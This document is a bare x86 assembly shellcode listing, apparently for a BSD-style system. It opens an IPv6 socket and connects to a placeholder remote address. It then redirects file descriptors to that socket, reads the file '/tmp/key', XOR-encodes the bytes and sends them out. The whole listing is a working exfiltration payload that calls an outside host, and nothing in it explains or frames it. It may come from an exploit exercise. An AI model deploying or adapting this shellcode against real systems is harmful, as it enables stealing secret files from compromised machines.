
#socket( 2,1,0)
#socket( 10,1,0)
socket:
	pushl $97
	popl  %eax
	cdq
	pushl %edx # 0
	incl  %edx
	pushl %edx # 1
	
	pushl $0x1c  #AF_INET6
	xorl %ecx, %ecx
	movb $0x60, %cl
	pushl %ecx # interface id
	
	int  $0x80

connect:
	pushl $0x11111114
	pushl $0x11111113
	pushl $0x11111112
	pushl $0x11111111

	xorl %ecx, %ecx
	pushl %ecx # flowinfo
	
	pushl $0xbfbf1cbc # port number

	movl  %esp, %ecx
	pushl $0x1c # size
	pushl %ecx # sockaddr *data
	pushl %eax # socket
	pushl %ecx 
	
	xchg %ebx, %eax 
	
	pushl $98 
	popl  %eax
	int  $0x80
	
dup:
	pushl $0x2
	popl  %ecx
	
dup_loop:
	pushl $0x5a
	popl  %eax
	pushl %edx
	pushl %ebx
	
	pushl %edx
	int  $0x80
	decl  %edx
	jns  dup_loop

jmp data_path
# edx=open (filepath, 1, 0)
open:
        popl %ebx           ## ebx = filepath
	xorl %eax, %eax
	push %eax        # mode
	push %eax        # flags
	push %ebx        # file path
	push %ebx        # dummy
	xorl %eax, %eax
	movb $5, %al
	int $0x80
	movl %eax, %edx

# read (edx, esi, 32)
read:
	movl %esp, %esi
	sub $0x80, %esp

        xorl %eax, %eax
	movb $0xaa, %al
	push %eax        ## 32 bytes
	push %esi        ## buff
	movl %edx, %eax  ## read from the file
	push %eax
	push %eax        ## dummy
	movb $3, %al
	int $0x80

	xorl %ecx, %ecx
xor_loop:
	movb (%esi, %ecx), %al
	xorb $0x99, %al  
	movb %al, (%esi, %ecx)
	incl %ecx	
	cmpb $0xaa, %cl
	jnz xor_loop 
	
# write (edx, esi, 32)
write:
        xorl %eax, %eax
	movb $0xaa, %al
	push %eax        ## 32 bytes
	push %esi        ## buff
	push $0x0        ## write to the socket
	push %eax        ## dummy
	movb $4, %al
	int $0x80

# exit()
exit:
        movb $1, %al
        int $0x80

data_path:
call open
        .ascii "/tmp/key\0"

